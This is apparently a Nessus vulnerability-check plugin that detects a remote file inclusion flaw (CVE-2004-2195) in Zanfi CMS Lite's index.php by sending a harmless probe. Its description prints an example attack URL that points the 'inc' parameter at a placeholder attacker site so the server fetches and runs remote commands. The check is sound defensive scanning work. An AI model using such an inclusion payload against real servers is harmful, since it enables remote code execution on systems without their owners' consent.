#
# (C) Tenable Network Security
#
#

if (description)
{
 script_id(15452);
 script_cve_id("CVE-2004-2195");
 script_bugtraq_id(11362);
 script_version ("$Revision: 1.6 $");

 script_name(english:"Zanfi CMS Lite Remote File Include");
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to arbitrary
PHP code execution and file disclosure attacks. 

Description :

The remote host is running Zanfi CMS Lite, a content management system
written in PHP. 

There is a bug in the remote version of this software that may allow
an attacker to execute arbitrary commands on the remote host by using
a file inclusion bug in the file 'index.php'. 

An attacker may execute arbitrary commands by requesting :

  http://www.example.com/index.php?inc=http://[evilsite]/commands

This will make the remote script include the file 'commands.php' and
execute it. 

See also :

http://www.securityfocus.com/archive/1/378053

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 script_summary(english:"Determines if Zanfi CMS can include third-party files");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

foreach d (cgi_dirs())
{
 url = string(d, "/index.php?inc=http://xxxxxx./foo");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( buf == NULL ) exit(0);
 if ( "getaddrinfo failed" >< buf )
 {
  security_warning(port);
  exit(0);
 }
}
